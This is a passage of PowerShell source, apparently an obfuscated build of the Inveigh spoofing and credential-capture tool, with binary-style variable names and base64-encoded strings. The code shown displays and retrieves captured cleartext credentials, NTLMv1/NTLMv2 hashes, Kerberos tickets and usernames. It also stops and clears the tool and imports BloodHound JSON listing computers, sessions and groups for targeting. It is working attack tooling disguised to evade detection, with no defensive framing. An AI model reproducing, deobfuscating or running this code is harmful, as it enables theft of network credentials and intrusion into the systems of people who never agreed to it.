                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBpAGcAbgBvAHIAaQBuAGcAKgA='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAEgAVABUAFAAKgByAGUAcQB1AGUAcwB0ACAAZgBvAHIAIAAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAFAAcgBvAHgAeQAqAHIAZQBxAHUAZQBzAHQAIABmAG8AcgAgACoA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAFkATgAgAHAAYQBjAGsAZQB0ACoA')))}
                    {
                        if($ConsoleOutput -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA'))))
                        {
                            if(${00101000010000101}.output_stream_only)
                            {
                                echo(${00101000010000101}.console_queue[0] + ${00101000010000101}.newline)
                            }
                            else
                            {
                                echo(${00101000010000101}.console_queue[0])
                            }
                        }
                        ${00101000010000101}.console_queue.RemoveAt(0)
                    } 
                    default
                    {
                        if(${00101000010000101}.output_stream_only)
                        {
                            echo(${00101000010000101}.console_queue[0] + ${00101000010000101}.newline)
                        }
                        else
                        {
                            echo(${00101000010000101}.console_queue[0])
                        }
                        ${00101000010000101}.console_queue.RemoveAt(0)
                    }
                }
            }
            if($ConsoleStatus -and ${00101011011000010}.Elapsed -ge ${00100000000111001})
            {
                if(${00101000010000101}.cleartext_list.Count -gt 0)
                {
                    echo("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + ${00101000010000101}.newline)
                    ${00101000010000101}.cleartext_list.Sort()
                    ${01001111110100110} = ${00101000010000101}.cleartext_list
                    foreach(${00000100101100001} in ${01001111110100110})
                    {
                        if(${00000100101100001} -ne ${00101111100111001})
                        {
                            echo(${00000100101100001} + ${00101000010000101}.newline)
                        }
                        ${00101111100111001} = ${00000100101100001}
                    }
                    sleep -m 5
                }
                else
                {
                    echo("[+] [$(Get-Date -format s)] No cleartext credentials have been captured" + ${00101000010000101}.newline)
                }
                if(${00101000010000101}.POST_request_list.Count -gt 0)
                {
                    echo("[*] [$(Get-Date -format s)] Current unique POST request captures:" + ${00101000010000101}.newline)
                    ${00101000010000101}.POST_request_list.Sort()
                    ${10110010010101101} = ${00101000010000101}.POST_request_list
                    foreach(${01101101101001010} in ${10110010010101101})
                    {
                        if(${01101101101001010} -ne ${00110000011010101})
                        {
                            echo(${01101101101001010} + ${00101000010000101}.newline)
                        }
                        ${00110000011010101} = ${01101101101001010}
                    }
                    sleep -m 5
                }
                if(${00101000010000101}.NTLMv1_list.Count -gt 0)
                {
                    echo("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + ${00101000010000101}.newline)
                    ${00101000010000101}.NTLMv1_list.Sort()
                    ${00110011000010001} = ${00101000010000101}.NTLMv1_list
                    foreach(${01011011001101101} in ${00110011000010001})
                    {
                        ${10000000010110111} = ${01011011001101101}.SubString(0,${01011011001101101}.IndexOf(":",(${01011011001101101}.IndexOf(":") + 2)))
                        if(${10000000010110111} -ne ${01011001100101100})
                        {
                            echo(${01011011001101101} + ${00101000010000101}.newline)
                        }
                        ${01011001100101100} = ${10000000010110111}
                    }
                    ${01011001100101100} = ''
                    sleep -m 5
                    echo("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + ${00101000010000101}.newline)
                    ${01101101100111000} = ${00101000010000101}.NTLMv1_username_list
                    foreach(${00101110000110011} in ${01101101100111000})
                    {
                        echo(${00101110000110011} + ${00101000010000101}.newline)
                    }
                    sleep -m 5
                }
                else
                {
                    echo("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured" + ${00101000010000101}.newline)
                }
                if(${00101000010000101}.NTLMv2_list.Count -gt 0)
                {
                    echo("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + ${00101000010000101}.newline)
                    ${00101000010000101}.NTLMv2_list.Sort()
                    ${00001100010011011} = ${00101000010000101}.NTLMv2_list
                    foreach(${00110011011010101} in ${00001100010011011})
                    {
                        ${10111011100011000} = ${00110011011010101}.SubString(0,${00110011011010101}.IndexOf(":",(${00110011011010101}.IndexOf(":") + 2)))
                        if(${10111011100011000} -ne ${00101001100011101})
                        {
                            echo(${00110011011010101} + ${00101000010000101}.newline)
                        }
                        ${00101001100011101} = ${10111011100011000}
                    }
                    ${00101001100011101} = ''
                    sleep -m 5
                    echo("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + ${00101000010000101}.newline)
                    ${01111001100110000} = ${00101000010000101}.NTLMv2_username_list
                    foreach(${10111010101000100} in ${01111001100110000})
                    {
                        echo(${10111010101000100} + ${00101000010000101}.newline)
                    }
                }
                else
                {
                    echo("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured" + ${00101000010000101}.newline)
                }
                ${00101011011000010} = [System.Diagnostics.Stopwatch]::StartNew()
            }
            if(${00101000010000101}.console_input)
            {
                if([Console]::KeyAvailable)
                {
                    ${00101000010000101}.console_output = $false
                    BREAK console_loop
                }
            }
            sleep -m 5
        }
    }
}
finally
{
    if($Tool -eq 2)
    {
        ${00101000010000101}.running = $false
    }
}
}
function Stop-Inveigh
{
    if(${00101000010000101})
    {
        ${00101000010000101}.stop = $true
        if(${00101000010000101}.running -or ${00101000010000101}.relay_running)
        {
            ${00101000010000101}.console_queue.Clear()
            _01101100111101001 -_00000110110011111
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABUAGgAZQByAGUAIABhAHIAZQAgAG4AbwAgAHIAdQBuAG4AaQBuAGcAIABJAG4AdgBlAGkAZwBoACAAZgB1AG4AYwB0AGkAbwBuAHMA')))
        }
    }
}
function Get-Inveigh
{
    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][Switch]$Cleartext,
        [parameter(Mandatory=$false)][Switch]$CleartextUnique,
        [parameter(Mandatory=$false)][Switch]$Console,
        [parameter(Mandatory=$false)][Switch]$ADIDNS,
        [parameter(Mandatory=$false)][Switch]$ADIDNSFailed,
        [parameter(Mandatory=$false)][Int]$KerberosTGT,
        [parameter(Mandatory=$false)][Switch]$KerberosUsername,
        [parameter(Mandatory=$false)][Switch]$Learning,
        [parameter(Mandatory=$false)][Switch]$Log,
        [parameter(Mandatory=$false)][Switch]$NTLMv1,
        [parameter(Mandatory=$false)][Switch]$NTLMv2,
        [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
        [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
        [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
        [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
        [parameter(Mandatory=$false)][Switch]$POSTRequest,
        [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,
        [parameter(Mandatory=$false)][Switch]$Session,
        [parameter(Mandatory=$false)][Switch]$Enumerate,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )
    if($Console -or $PSBoundParameters.Count -eq 0)
    {
        while(${00101000010000101}.console_queue.Count -gt 0)
        {
            if(${00101000010000101}.output_stream_only)
            {
                echo(${00101000010000101}.console_queue[0] + ${00101000010000101}.newline)
                ${00101000010000101}.console_queue.RemoveAt(0)
            }
            else
            {
                switch -wildcard (${00101000010000101}.console_queue[0])
                {
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbACEAXQAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbAC0AXQAqAA==')))}
                    {
                        Write-Warning ${00101000010000101}.console_queue[0]
                        ${00101000010000101}.console_queue.RemoveAt(0)
                    }
                    default
                    {
                        echo ${00101000010000101}.console_queue[0]
                        ${00101000010000101}.console_queue.RemoveAt(0)
                    }
                }
            }
        }
    }
    if($ADIDNS)
    {
        ${00010110100001001} = ${00101000010000101}.ADIDNS_table.Keys
        foreach(${10110100111011000} in ${00010110100001001})
        {
            if(${00101000010000101}.ADIDNS_table.${10110100111011000} -ge 1)
            {
                echo ${10110100111011000}
            }
        }
    }
    if($ADIDNSFailed)
    {
        ${00010110100001001} = ${00101000010000101}.ADIDNS_table.Keys
        foreach(${10110100111011000} in ${00010110100001001})
        {
            if(${00101000010000101}.ADIDNS_table.${10110100111011000} -eq 0)
            {
                echo ${10110100111011000}
            }
        }
    }
    if($KerberosTGT)
    {
        echo ${00101000010000101}.kerberos_TGT_list[$KerberosTGT]
    }
    if($KerberosUsername)
    {
        echo ${00101000010000101}.kerberos_TGT_username_list
    }
    if($Log)
    {
        echo ${00101000010000101}.log
    }
    if($NTLMv1)
    {
        echo ${00101000010000101}.NTLMv1_list
    }
    if($NTLMv1Unique)
    {
        ${00101000010000101}.NTLMv1_list.Sort()
        ${00110011000010001} = ${00101000010000101}.NTLMv1_list
        foreach(${01011011001101101} in ${00110011000010001})
        {
            ${10000000010110111} = ${01011011001101101}.SubString(0,${01011011001101101}.IndexOf(":",(${01011011001101101}.IndexOf(":") + 2)))
            if(${10000000010110111} -ne ${01011001100101100})
            {
                echo ${01011011001101101}
            }
            ${01011001100101100} = ${10000000010110111}
        }
    }
    if($NTLMv1Usernames)
    {
        echo ${00101000010000101}.NTLMv2_username_list
    }
    if($NTLMv2)
    {
        echo ${00101000010000101}.NTLMv2_list
    }
    if($NTLMv2Unique)
    {
        ${00101000010000101}.NTLMv2_list.Sort()
        ${00001100010011011} = ${00101000010000101}.NTLMv2_list
        foreach(${00110011011010101} in ${00001100010011011})
        {
            ${10111011100011000} = ${00110011011010101}.SubString(0,${00110011011010101}.IndexOf(":",(${00110011011010101}.IndexOf(":") + 2)))
            if(${10111011100011000} -ne ${00101001100011101})
            {
                echo ${00110011011010101}
            }
            ${00101001100011101} = ${10111011100011000}
        }
    }
    if($NTLMv2Usernames)
    {
        echo ${00101000010000101}.NTLMv2_username_list
    }
    if($Cleartext)
    {
        echo ${00101000010000101}.cleartext_list
    }
    if($CleartextUnique)
    {
        echo ${00101000010000101}.cleartext_list | gu
    }
    if($POSTRequest)
    {
        echo ${00101000010000101}.POST_request_list
    }
    if($POSTRequestUnique)
    {
        echo ${00101000010000101}.POST_request_list | gu
    }
    if($Learning)
    {
        echo ${00101000010000101}.valid_host_list
    }
    if($Session)
    {
        ${01100001111100111} = 0
        while(${01100001111100111} -lt ${00101000010000101}.session_socket_table.Count)
        {
            if(!${00101000010000101}.session_socket_table[${01100001111100111}].Connected)
            {
                ${00101000010000101}.session[${01100001111100111}] | ? {$_.Status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAYwBvAG4AbgBlAGMAdABlAGQA')))}
            }
            ${01100001111100111}++
        }
        echo ${00101000010000101}.session | ft -AutoSize
    }
    if($Enumerate)
    {
        echo ${00101000010000101}.enumerate
    }
}
function _01101100111101001
{
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Switch]${_00000110110011111},
    [parameter(Mandatory=$false)][ValidateSet("Low","Medium","Y")][String]$ConsoleOutput = "Y",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)
if(${00101000010000101}.tool -ne 1)
{
    if(${00101000010000101}.running -or ${00101000010000101}.relay_running)
    {
        if(!${_00000110110011111})
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAHIAZQBzAHMAIABhAG4AeQAgAGsAZQB5ACAAdABvACAAcwB0AG8AcAAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA=')))
        }
        ${00101000010000101}.console_output = $true
        :console_loop while(((${00101000010000101}.running -or ${00101000010000101}.relay_running) -and ${00101000010000101}.console_output) -or (${00101000010000101}.console_queue.Count -gt 0 -and ${00101000010000101}.console_output))
        {
            while(${00101000010000101}.console_queue.Count -gt 0)
            {
                switch -wildcard (${00101000010000101}.console_queue[0])
                {
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbACEAXQAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbAC0AXQAqAA==')))}
                    {
                        Write-Warning ${00101000010000101}.console_queue[0]
                        ${00101000010000101}.console_queue.RemoveAt(0)
                    }
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHAAbwBvAGYAZQByACAAZABpAHMAYQBiAGwAZQBkAF0A'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AYwBhAGwAIAByAGUAcQB1AGUAcwB0AF0A'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGgAbwBzAHQAIABoAGUAYQBkAGUAcgAgACoA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHUAcwBlAHIAIABhAGcAZQBuAHQAIAByAGUAYwBlAGkAdgBlAGQAIAAqAA==')))}
                    {
                        if($ConsoleOutput -eq 'Y')
                        {
                            echo ${00101000010000101}.console_queue[0]
                        }
                        ${00101000010000101}.console_queue.RemoveAt(0)
                    } 
                    {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBpAGcAbgBvAHIAaQBuAGcAKgA='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAEgAVABUAFAAKgByAGUAcQB1AGUAcwB0ACAAZgBvAHIAIAAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAFAAcgBvAHgAeQAqAHIAZQBxAHUAZQBzAHQAIABmAG8AcgAgACoA'))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAFkATgAgAHAAYQBjAGsAZQB0ACoA')))}
                    {
                        if($ConsoleOutput -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA'))))
                        {
                            echo ${00101000010000101}.console_queue[0]
                        }
                        ${00101000010000101}.console_queue.RemoveAt(0)
                    } 
                    default
                    {
                        echo ${00101000010000101}.console_queue[0]
                        ${00101000010000101}.console_queue.RemoveAt(0)
                    }
                } 
            }
            if([Console]::KeyAvailable)
            {
                ${00101000010000101}.console_output = $false
                BREAK console_loop
            }
            sleep -m 5
        }
    }
    else
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABJAG4AdgBlAGkAZwBoACAAaQBzAG4AJwB0ACAAcgB1AG4AbgBpAG4AZwA=')))
    }
}
else
{
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABXAGEAdABjAGgALQBJAG4AdgBlAGkAZwBoACAAYwBhAG4AbgBvAHQAIABiAGUAIAB1AHMAZQBkACAAdwBpAHQAaAAgAGMAdQByAHIAZQBuAHQAIABlAHgAdABlAHIAbgBhAGwAIAB0AG8AbwBsACAAcwBlAGwAZQBjAHQAaQBvAG4A')))
}
}
function Clear-Inveigh
{
if(${00101000010000101})
{
    if(!${00101000010000101}.running -and !${00101000010000101}.relay_running)
    {
        rv inveigh -scope global
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABJAG4AdgBlAGkAZwBoACAAZABhAHQAYQAgAGgAYQBzACAAYgBlAGUAbgAgAGMAbABlAGEAcgBlAGQAIABmAHIAbwBtACAAbQBlAG0AbwByAHkA')))
    }
    else
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABSAHUAbgAgAFMAdABvAHAALQBJAG4AdgBlAGkAZwBoACAAYgBlAGYAbwByAGUAIAByAHUAbgBuAGkAbgBnACAAQwBsAGUAYQByAC0ASQBuAHYAZQBpAGcAaAA=')))
    }
}
}
function ConvertTo-Inveigh
{
    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Computers,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Sessions,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Groups,
        [parameter(Mandatory=$false)][Switch]$DNS,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )
    if(!$Computers -and !$Sessions -and !$Groups)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAGUAYwBpAGYAaQB5ACAAYQAgAEIAbABvAG8AZABIAG8AdQBuAGQAIABjAG8AbQBwAHUAdABlAHIAcwAsACAAZwByAG8AdQBwAHMALAAgAG8AcgAgAHMAZQBzAHMAaQBvAG4AcwAgAEoAUwBPAE4AIABmAGkAbABlAA==')))
        throw
    }
    if(${00101000010000101}.running -or ${00101000010000101}.relay_running)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAGIAZQBmAG8AcgBlACAAaQBtAHAAbwByAHQAaQBuAGcAIABkAGEAdABhACAAdwBpAHQAaAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASQBuAHYAZQBpAGcAaAA=')))
        throw
    }
    if(!${00101000010000101})
    {
        ${global:00101000010000101} = [HashTable]::Synchronized(@{})
        ${00101000010000101}.cleartext_list = New-Object System.Collections.ArrayList
        ${00101000010000101}.enumerate = New-Object System.Collections.ArrayList
        ${00101000010000101}.IP_capture_list = New-Object System.Collections.ArrayList
        ${00101000010000101}.log = New-Object System.Collections.ArrayList
        ${00101000010000101}.kerberos_TGT_list = New-Object System.Collections.ArrayList
        ${00101000010000101}.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
        ${00101000010000101}.NTLMv1_list = New-Object System.Collections.ArrayList
        ${00101000010000101}.NTLMv1_username_list = New-Object System.Collections.ArrayList
        ${00101000010000101}.NTLMv2_list = New-Object System.Collections.ArrayList
        ${00101000010000101}.NTLMv2_username_list = New-Object System.Collections.ArrayList
        ${00101000010000101}.POST_request_list = New-Object System.Collections.ArrayList
        ${00101000010000101}.valid_host_list = New-Object System.Collections.ArrayList
        ${00101000010000101}.ADIDNS_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.relay_privilege_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.relay_failed_login_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.relay_history_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.request_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.session_socket_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.session_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.session_message_ID_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.session_lock_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.SMB_session_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.domain_mapping_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.group_table = [HashTable]::Synchronized(@{})
        ${00101000010000101}.session_count = 0
        ${00101000010000101}.session = @()
    }
    function _01100101100001011
    {
        param ($IP,${_01011101001101001},${_00000101111110001},${_10111111011110101},$Sessions,${_10010101010010110},${_01111001111010100},
            ${_10011010001001010},${_01000001001001101},${_01010000001111111},${_00100001101001011},${_10111100100111111},${_01111111101001110},${_10101000000111010},${_00010110000000111},${_10001010010110110},
            ${_10100111010000011},${_10101011100011101},$Enumerate,${_00110001010100100})
        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
        if(${_10010101010010110} -and ${_10010101010010110} -isnot [Array]){${_10010101010010110} = @(${_10010101010010110})}
        if(${_01111001111010100} -and ${_01111001111010100} -isnot [Array]){${_01111001111010100} = @(${_01111001111010100})}
        if(${_10011010001001010} -and ${_10011010001001010} -isnot [Array]){${_10011010001001010} = @(${_10011010001001010})}
        if(${_01000001001001101} -and ${_01000001001001101} -isnot [Array]){${_01000001001001101} = @(${_01000001001001101})}
        if(${_01010000001111111} -and ${_01010000001111111} -isnot [Array]){${_01010000001111111} = @(${_01010000001111111})}
        if(${_00100001101001011} -and ${_00100001101001011} -isnot [Array]){${_00100001101001011} = @(${_00100001101001011})}
        if(${_10111100100111111} -and ${_10111100100111111} -isnot [Array]){${_10111100100111111} = @(${_10111100100111111})}
        ${10011011100011000} = New-Object PSObject
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGQAZQB4AA=='))) ${00101000010000101}.enumerate.Count
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name "IP" $IP
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))) ${_01011101001101001}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAIABEAG8AbQBhAGkAbgA='))) ${_00000101111110001}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAQgBJAE8AUwAgAEQAbwBtAGEAaQBuAA=='))) ${_10111111011110101}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBzAA=='))) $Sessions
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAFUAcwBlAHIAcwA='))) ${_10010101010010110}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAEcAcgBvAHUAcABzAA=='))) ${_01111001111010100}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAZAA='))) ${_10011010001001010}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAHMA'))) ${_01000001001001101}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgBzAA=='))) ${_01010000001111111}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgBzACAATQBhAHAAcABlAGQA'))) ${_00100001101001011}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAVQBzAGUAcgBzAA=='))) ${_10111100100111111}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA'))) ${_01111111101001110}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBpAG4AZwA='))) ${_10101000000111010}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABTAGUAcgB2AGUAcgA='))) ${_00010110000000111}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAIABSAGUAYwBvAHIAZAA='))) ${_10001010010110110}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAHYANgAgAE8AbgBsAHkA'))) ${_10100111010000011}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAZQBkAA=='))) ${_10101011100011101}
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA'))) $Enumerate
        Add-Member -InputObject ${10011011100011000} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))) ${_00110001010100100}
        return ${10011011100011000}
    }
    function _01111111111000111([String]${_01011101001101001})
    {
        try
        {
            ${00101101111010010} = [System.Net.Dns]::GetHostEntry(${_01011101001101001})
            foreach(${10101011000010001} in ${00101101111010010}.AddressList)
            {
                if(!${10101011000010001}.IsIPv6LinkLocal)
                {
                    $IP = ${10101011000010001}.IPAddressToString
                }
            }
        }
        catch
        {
            $IP = $null
        }
        return $IP
    }
    function _10111100001101011(${_10111000110010010}) 
    {
        if(${_10111000110010010}.PSObject.TypeNames -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAHIAYQB5AA==')))) 
        {
            return _01101110001101010(${_10111000110010010})
        }
        elseif(${_10111000110010010}.PSObject.TypeNames -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQA=')))) 
        {
            return _10101100111100000([HashTable]${_10111000110010010})
        }
        else 
        {
            return ${_10111000110010010}
        }
    }
    function _10101100111100000(${_00100110001010111}) 
    {
        ${00001101111010100} = New-Object -TypeName PSCustomObject
        foreach(${00101011000000011} in ${_00100110001010111}.Keys) 
        {
            ${00001000001001001} = ${_00100110001010111}[${00101011000000011}]
            if (${00001000001001001}) 
            {
                ${01110000110000111} = _10111100001101011 ${00001000001001001}
            }
            else 
            {
                ${01110000110000111} = $null
            }
            ${00001101111010100} | Add-Member -MemberType NoteProperty -Name ${00101011000000011} -Value ${01110000110000111}
        }
        return ${00001101111010100}
    }
    function _01101110001101010(${_10110111100100010}) 
    {
        ${00001101111010100} = @()
        ${00111111010101101} = [System.Diagnostics.Stopwatch]::StartNew()
        ${01100001111100111} = 0
        ${_10110111100100010} | % -Process {
            if(${00111111010101101}.Elapsed.TotalMilliseconds -ge 500)
            {
                ${10101010011101110} = [Math]::Truncate(${01100001111100111} / ${_10110111100100010}.count * 100)
                if(${10101010011101110} -le 100)
                {
                    Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBpAG4AZwAgAEoAUwBPAE4A'))) -Status $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADAAMQAwADEAMAAwADEAMQAxADAAMQAxADEAMAB9ACUAIABDAG8AbQBwAGwAZQB0AGUAOgA='))) -PercentComplete ${10101010011101110} -ErrorAction SilentlyContinue
                }
                ${00111111010101101}.Reset()
                ${00111111010101101}.Start()
            }
            ${01100001111100111}++
            ${00001101111010100} += , (_10111100001101011 $_)}
        return ${00001101111010100}
    }
    function Invoke-ParseJSONString($json) 
    {
        ${01010000111100110} = $javaScriptSerializer.DeserializeObject($json)
        return _10101100111100000 ${01010000111100110}
    }
    [void][System.Reflection.Assembly]::LoadWithPartialName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBXAGUAYgAuAEUAeAB0AGUAbgBzAGkAbwBuAHMA'))))
    if(${00101000010000101}.enumerate.Count -eq 0)
    {
        ${10110100010010100} = $true
    }
    if($Computers)
    {       
        $Computers = (rvpa $Computers).Path
        ${10000111010000100} = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        ${10000111010000100}.MaxJsonLength = 104857600
        ${11000010011101000} = [System.IO.File]::ReadAllText($Computers)
        ${11000010011101000} = ${10000111010000100}.DeserializeObject(${11000010011101000})
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcgBzAGkAbgBnACAAQgBsAG8AbwBkAEgAbwB1AG4AZAAgAEMAbwBtAHAAdQB0AGUAcgBzACAASgBTAE8ATgA=')))
        ${00101101000101101} = [System.Diagnostics.Stopwatch]::StartNew()
        ${11000010011101000} = _10111100001101011 ${11000010011101000}
        echo "[+] Parsing completed in $([Math]::Truncate(${00101101000101101}.Elapsed.TotalSeconds)) seconds"
        ${00101101000101101}.Reset()
        ${00101101000101101}.Start()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdABvACAASQBuAHYAZQBpAGcAaAA=')))
        ${00111111010101101} = [System.Diagnostics.Stopwatch]::StartNew()
        ${01100001111100111} = 0
        if(!${11000010011101000}.Computers)
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABKAFMATwBOACAAYwBvAG0AcAB1AHQAZQByAHMAIABwAGEAcgBzAGUAIABmAGEAaQBsAGUAZAA=')))
            throw
        }
        ${11000010011101000}.Computers | % {
            if(${00111111010101101}.Elapsed.TotalMilliseconds -ge 500)
            {
                ${10101010011101110} = [Math]::Truncate(${01100001111100111} / ${11000010011101000}.Computers.Count * 100)
                if(${10101010011101110} -le 100)
                {
